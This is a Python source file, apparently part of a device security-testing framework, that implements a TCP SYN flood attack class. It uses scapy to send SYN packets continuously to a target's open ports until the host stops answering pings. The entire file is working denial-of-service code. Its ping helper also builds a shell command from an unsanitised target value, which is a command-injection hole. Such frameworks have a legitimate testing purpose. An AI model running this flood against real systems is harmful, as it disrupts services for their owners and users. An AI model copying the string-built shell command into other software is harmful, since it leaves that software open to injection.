from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *
from re import search
from subprocess import Popen
from commands import getoutput


class TcpSyn(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(TcpSyn, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']

        if self.device["vulnerable_ports"] is None:
            return {"status": "no_open_ports"}
        elif self.device["vulnerable_ports"]["tcp"] is None:
            return {"status": "no_open_ports"}
        elif self.device["vulnerable_ports"]["tcp"]["open"] is None:
            return {"status": "no_open_ports"}

        """ Send packets
                """


        while self.running:
            for port in self.device["vulnerable_ports"]["tcp"]["open"]:
                pkt = IP(dst=target)
                pkt /= TCP(dport=port,window=1000, flags='S')
                send(pkt)

            if not self.is_alive():
                log.info('Host not responding!')
                return {"status": "not_responding"}

        return {"status": "responding"}

    def is_alive(self):
        """Check if the target is alive"""
        if not self.config['target'].value is None:
            rval = self.init_app('ping -c 1 -w 1 %s' % \
                                 self.config['target'].value, True)
            up = search('\d.*? received', rval)
            if search('0', up.group(0)) is None:
                return True
        return False

    def init_app(self, prog, output=True):
        """inititalize an application
           PROG is the full command with args
           OUTPUT true if output should be returned
           false if output should be dumped to null.  This will
           return a process handle and is meant for initializing
           background processes.  Use wisely.
        """
        # dump output to null
        if not output:
            try:
                null = open(os.devnull, 'w')
                proc = Popen(prog, stdout=null, stderr=null)
            except Exception, j:
                log.error("Error initializing app: %s" % j)
                return False
            return proc
        # just grab output
        else:
            return getoutput(prog)

    def shutdown(self):
        self.running = False

